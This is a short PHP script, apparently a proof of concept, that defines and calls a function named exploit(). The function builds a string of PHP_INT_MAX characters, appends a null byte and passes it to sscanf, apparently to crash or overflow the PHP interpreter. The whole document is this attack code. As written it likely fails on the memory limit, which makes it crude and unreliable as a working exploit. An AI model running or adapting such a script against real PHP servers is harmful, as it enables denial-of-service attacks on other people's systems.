<?php
function exploit() {
    $buf = str_repeat("a", PHP_INT_MAX);
    $buf.= "\x00";
    sscanf($buf, "%s");
}
exploit();
?>
